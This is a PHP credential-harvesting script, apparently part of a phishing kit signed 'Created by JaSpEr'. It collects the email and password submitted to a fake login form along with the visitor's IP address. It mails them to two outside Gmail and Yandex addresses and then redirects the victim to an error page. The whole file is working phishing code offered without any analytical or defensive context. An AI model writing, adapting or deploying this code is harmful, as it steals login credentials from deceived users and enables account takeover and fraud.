<? 

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------------------Jomo--------------------------\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "-------------------------Jomo-------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "-------------------------Created by JaSpEr---------------------------\n";
$recipient = "davrichnor123@gmail.com,goodlucky1010@yandex.com";
$subject = " User & Pass";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
  
      header("Location: Error-costing.php");

 ?>